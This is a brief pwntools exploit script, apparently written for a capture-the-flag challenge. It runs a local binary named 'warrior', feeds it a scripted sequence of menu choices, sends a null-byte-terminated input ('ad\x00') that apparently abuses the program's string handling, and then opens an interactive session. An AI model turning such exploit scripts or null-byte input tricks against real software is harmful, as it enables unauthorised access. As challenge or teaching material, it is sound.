from pwn import *

#libc = ELF("./libc.so.6")
#elf = context.binary = ELF("./xpl")

def main():
    io = process("./warrior")
    io.sendline("r")
    io.sendline("a")
    io.sendline("a")

    io.sendline("a")
    io.sendline("a")
    io.sendline("a")

    io.sendline("l")
    io.sendline("d")
    io.sendline('ad\x00')
    #io.sendline('a\x00')
    io.interactive()

if __name__ == "__main__":
    main()